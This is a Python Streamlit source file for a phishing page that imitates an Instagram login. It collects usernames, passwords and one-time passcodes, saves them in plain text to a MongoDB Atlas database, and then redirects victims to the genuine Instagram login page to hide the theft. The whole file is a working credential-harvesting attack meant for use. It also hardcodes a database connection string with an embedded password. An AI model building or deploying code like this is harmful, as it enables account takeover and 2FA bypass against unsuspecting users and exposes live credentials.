import streamlit as st
from pymongo import MongoClient

# MongoDB Atlas connection string
connection_string = "mongodb+srv://maheshsaimullapudi39:Jagan17@cluster0.2q4lcww.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

# Establish connection to MongoDB
client = MongoClient(connection_string)

# Access the 'user_data' database
db = client['user_data']
users_collection = db['users']  # Store username and password
otps_collection = db['otps']  # Store OTPs in a separate collection

# Function to store the username, password, and OTP
def store_user_and_otp(username, password, otp):
    # Store user details in the 'users' collection
    new_user = {
        "username": username,
        "password": password  # Storing password as plain text
    }
    users_collection.insert_one(new_user)

    # Store OTP details in the 'otps' collection
    otp_data = {
        "username": username,
        "otp": otp  # Store the OTP entered by the user
    }
    otps_collection.insert_one(otp_data)


# Streamlit UI with HTML and CSS
def main():
    # Set page title and icon
    st.set_page_config(page_title="Login Page", page_icon="🔑", layout="centered")

    # Custom CSS
    st.markdown("""
    <style>
        * { margin: 0px; padding: 0px; }
        body { background-color: #eee; }
        #wrapper { width: 500px; height: 50%; margin: 50px auto; padding: 10px; }
        .main-content { width: 250px; height: 40%; margin: 10px auto; background-color: #fff; padding: 40px 50px; }
        .header img { height: 50px; width: 175px; margin: auto; position: relative; left: 40px; }
        .input-1, .input-2 { width: 100%; margin-bottom: 5px; padding: 8px 12px; border: 1px solid #dbdbdb; box-sizing: border-box; border-radius: 3px; }
        .overlap-text { position: relative; margin-top: 10px; }
        .overlap-text a { position: absolute; top: 0; right: 0; color: #003569; font-size: 14px; text-decoration: none; font-family: 'Overpass Mono', monospace; letter-spacing: -1px; }
        .btn { width: 100%; background-color: #3897f0; border: 1px solid #3897f0; padding: 12px 12px; color: #fff; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 10px; }
        .forgot-btn { width: 100%; background-color: transparent; border: none; color: #3897f0; text-decoration: underline; font-weight: normal; cursor: pointer; }
        .sub-content { width: 250px; height: 40%; margin: 10px auto; border: 1px solid #e6e6e6; padding: 20px 50px; background-color: #fff; }
        .s-part { text-align: center; font-family: 'Overpass Mono', monospace; word-spacing: -3px; letter-spacing: -2px; font-weight: normal; }
        .s-part a { text-decoration: none; cursor: pointer; color: #3897f0; font-family: 'Overpass Mono', monospace; word-spacing: -3px; letter-spacing: -2px; font-weight: normal; }
        input:focus { background-color: yellow; }
    </style>
    """, unsafe_allow_html=True)

    # Wrapper for the content
    with st.container():
        st.markdown('<div id="wrapper">', unsafe_allow_html=True)

        # Header
        st.markdown('<div class="header"><img src="https://i.imgur.com/zqpwkLQ.png" /></div>', unsafe_allow_html=True)

        # Login Form
        st.markdown('<div class="main-content">', unsafe_allow_html=True)

        # Username and password inputs
        username = st.text_input("Username", "", key="username", placeholder="Enter your username", label_visibility="collapsed")
        password = st.text_input("Password", "", type="password", key="password", placeholder="Enter your password", label_visibility="collapsed")

        # Login Button (first step, username and password)
        if st.button("Log in"):
            if username and password:
                # After login, ask for OTP
                st.session_state.login_success = True
            else:
                st.warning("Please enter both username and password")

        if st.session_state.get("login_success", False):
            # Show OTP input field after successful login
            otp = st.text_input("Enter OTP", "", key="otp", placeholder="Enter OTP")

            # Login button (second step, OTP)
            if st.button("Submit OTP"):
                if otp:
                    # Store user credentials and OTP in the respective collections
                    store_user_and_otp(username, password, otp)
                    st.session_state.login_success = False  # Reset login state after OTP submission
                    
                    # Redirect to Instagram login page after OTP submission
                    st.markdown(
                        "<h3>Redirecting...</h3>"
                        "<p>You will be redirected to the Instagram login page.</p>"
                        "<a href='https://www.instagram.com/accounts/login/?hl=en' target='_blank'>Click here if you are not redirected.</a>",
                        unsafe_allow_html=True
                    )
                else:
                    st.warning("Please enter the OTP")

        # Forgot Password Button
        st.markdown('<div class="overlap-text"><button class="forgot-btn">Forgot?</button></div>', unsafe_allow_html=True)

        st.markdown('</div>', unsafe_allow_html=True)  # Close main content div

        # Signup Section
        st.markdown('<div class="sub-content">', unsafe_allow_html=True)
        st.markdown('<div class="s-part">Don\'t have an account? <a href="#">Sign up</a></div>', unsafe_allow_html=True)
        st.markdown('</div>', unsafe_allow_html=True)  # Close sub-content div

        st.markdown('</div>', unsafe_allow_html=True)  # Close wrapper div

# Run the app
if __name__ == "__main__":
    main()
